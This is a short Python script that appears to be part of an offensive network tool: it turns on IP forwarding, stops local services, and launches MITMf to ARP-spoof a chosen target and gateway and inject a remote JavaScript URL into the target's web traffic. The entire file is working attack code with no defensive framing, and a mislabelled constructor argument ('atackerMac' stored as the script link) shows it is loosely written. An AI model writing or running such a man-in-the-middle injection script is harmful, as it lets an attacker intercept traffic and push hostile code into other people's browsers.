import time

import os
def jsAttackThread(hostIP,routerIP, scriptLink):
    jsInjection = JSInjection(hostIP,routerIP, scriptLink)
    jsInjection.enableForwarding()
    jsInjection.startSpoof()

class JSInjection(object):

    def __init__(self,hostIP,routerIP, atackerMac):
        self.hostIP = hostIP
        self.routerIP = routerIP
        self.scriptLink = atackerMac
    
    def enableForwarding(self):
        try:
            os.popen("echo 1 > /proc/sys/net/ipv4/ip_forward")
        except:
            pass
    
    def startSpoof(self):
        os.system('gnome-terminal -x sh -c "service smbd stop; service apache2 stop; killall dnsmasq;  mitmf -i eth0 --spoof --arp --target '+str(self.hostIP)+' --gateway '+str(self.routerIP)+' --inject --js-url '+str(self.scriptLink)+'"')
        #subproces communication
        #print os.popen('service smbd stop')# & service apache2 stop & killall dnsmasq &  mitmf -i eth0 --spoof --arp --target '+str(self.hostIP)+' --gateway '+str(self.routerIP)+' --inject --js-url '+str(self.scriptLink)+'')
        #iptables -t nat -A PREROUTING -p tcp --dport '+str(port)+' --jump DNAT --to-destination '+str(ip)).read().strip()

            
            #
            